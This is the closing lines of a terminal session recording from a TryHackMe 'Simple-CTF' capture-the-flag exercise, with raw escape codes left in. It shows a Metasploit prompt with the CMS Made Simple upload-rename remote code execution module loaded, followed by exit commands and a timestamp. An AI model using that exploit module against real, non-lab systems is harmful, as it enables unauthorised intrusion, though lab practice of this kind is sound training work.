+[0m[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> exit
+[0m[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exit
+[?2004lexit
+
+Script done on 2020-11-20 09:35:03-03:00 [COMMAND_EXIT_CODE="0"]
